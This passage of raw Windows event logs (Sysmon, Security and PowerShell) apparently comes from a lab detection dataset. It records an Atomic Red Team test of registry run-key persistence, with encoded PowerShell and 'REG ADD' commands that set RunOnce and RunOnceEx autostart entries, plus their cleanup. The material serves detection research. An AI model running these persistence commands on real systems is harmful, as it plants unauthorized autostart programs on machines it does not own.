WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:42.588937000Z'/><EventRecordID>116616</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2022-02-17 02:15:42.574</Data><Data Name='ProcessGuid'>{E163F41D-AFCE-620D-4F14-000000003602}</Data><Data Name='ProcessId'>6912</Data><Data Name='Image'>C:\Windows\system32\reg.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1</Data><Data Name='Details'>C:\Path\AtomicRedTeam.dll</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:42.584591500Z'/><EventRecordID>116608</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:15:42.583</Data><Data Name='ProcessGuid'>{E163F41D-AFCE-620D-4F14-000000003602}</Data><Data Name='ProcessId'>6912</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>REG  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll" </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AFCB-620D-E299-D30000000000}</Data><Data Name='LogonId'>0xd399e2</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD,IMPHASH=EE7EB7FA7D163340753B7223ADA14352</Data><Data Name='ParentProcessGuid'>{E163F41D-AFCE-620D-4E14-000000003602}</Data><Data Name='ParentProcessId'>6540</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"" </Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:15:42.577322000Z'/><EventRecordID>116599</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:15:42.575</Data><Data Name='ProcessGuid'>{E163F41D-AFCE-620D-4E14-000000003602}</Data><Data Name='ProcessId'>6540</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"" </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AFCB-620D-E299-D30000000000}</Data><Data Name='LogonId'>0xd399e2</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A</Data><Data Name='ParentProcessGuid'>{E163F41D-AFCD-620D-4714-000000003602}</Data><Data Name='ParentProcessId'>7140</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data></EventData></Event>
+02/17/2022 02:13:49 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=130503
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+{Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore}
+
+ScriptBlock ID: 128a4ec5-ec76-403e-b056-7bf88caae6a7
+Path:
+02/17/2022 02:13:49 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=130501
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+& {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore}
+
+ScriptBlock ID: e5b01c2c-da0b-46eb-9126-0e2bc8c5eace
+Path:
+02/17/2022 02:13:49 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8880043
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xCAFDC7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1268
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x19ac
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name \""NextRun\"" -Force -ErrorAction Ignore} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:13:49 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4674
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Sensitive Privilege Use
+OpCode=Info
+RecordNumber=8880033
+Keywords=Audit Success
+Message=An operation was attempted on a privileged object.
+
+Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xCAFDC7
+
+Object:
+	Object Server:	Security
+	Object Type:	Key
+	Object Name:	\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+	Object Handle:	0xa0
+
+Process Information:
+	Process ID:	0x18cc
+	Process Name:	C:\Windows\System32\reg.exe
+
+Requested Operation:
+	Desired Access:	DELETE
+				READ_CONTROL
+				WRITE_DAC
+				WRITE_OWNER
+				Query key value
+				Set key value
+				Create sub-key
+				Enumerate sub-keys
+				Notify about changes to keys
+				Create Link
+				
+	Privileges:		SeTakeOwnershipPrivilege
+02/17/2022 02:13:49 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8880027
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xCAFDC7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x18cc
+	New Process Name:	C:\Windows\System32\reg.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18a8
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f  
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:13:49 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8880026
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xCAFDC7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x18a8
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x19ac
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:49.387710500Z'/><EventRecordID>111951</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>DeleteValue</Data><Data Name='UtcTime'>2022-02-17 02:13:49.386</Data><Data Name='ProcessGuid'>{E163F41D-AF5D-620D-9B13-000000003602}</Data><Data Name='ProcessId'>4712</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:49.227789400Z'/><EventRecordID>111933</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:49.226</Data><Data Name='ProcessGuid'>{E163F41D-AF5D-620D-9B13-000000003602}</Data><Data Name='ProcessId'>4712</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" &amp; {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name \""NextRun\"" -Force -ErrorAction Ignore} </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF5A-620D-C7FD-CA0000000000}</Data><Data Name='LogonId'>0xcafdc7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{E163F41D-AF5C-620D-9213-000000003602}</Data><Data Name='ParentProcessId'>6572</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbABlAGEAbgB1AHAA</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:49.203053000Z'/><EventRecordID>111924</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>DeleteValue</Data><Data Name='UtcTime'>2022-02-17 02:13:49.198</Data><Data Name='ProcessGuid'>{E163F41D-AF5D-620D-9A13-000000003602}</Data><Data Name='ProcessId'>6348</Data><Data Name='Image'>C:\Windows\system32\reg.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:49.198508500Z'/><EventRecordID>111916</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:49.196</Data><Data Name='ProcessGuid'>{E163F41D-AF5D-620D-9A13-000000003602}</Data><Data Name='ProcessId'>6348</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f  </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF5A-620D-C7FD-CA0000000000}</Data><Data Name='LogonId'>0xcafdc7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD,IMPHASH=EE7EB7FA7D163340753B7223ADA14352</Data><Data Name='ParentProcessGuid'>{E163F41D-AF5D-620D-9913-000000003602}</Data><Data Name='ParentProcessId'>6312</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f &gt;nul 2&gt;&amp;1" </Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:49.191550200Z'/><EventRecordID>111907</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:49.189</Data><Data Name='ProcessGuid'>{E163F41D-AF5D-620D-9913-000000003602}</Data><Data Name='ProcessId'>6312</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c "REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f &gt;nul 2&gt;&amp;1" </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF5A-620D-C7FD-CA0000000000}</Data><Data Name='LogonId'>0xcafdc7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A</Data><Data Name='ParentProcessGuid'>{E163F41D-AF5C-620D-9213-000000003602}</Data><Data Name='ParentProcessId'>6572</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbABlAGEAbgB1AHAA</Data></EventData></Event>
+02/17/2022 02:13:44 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8878497
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xBD3FF5
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1a80
+	New Process Name:	C:\Windows\System32\reg.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x37c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	REG  ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v RunScript /t REG_SZ /d "C:\setup\script.cmd" /f
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:44.064610100Z'/><EventRecordID>111544</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2022-02-17 02:13:44.058</Data><Data Name='ProcessGuid'>{E163F41D-AF58-620D-7F13-000000003602}</Data><Data Name='ProcessId'>6784</Data><Data Name='Image'>C:\Windows\system32\reg.exe</Data><Data 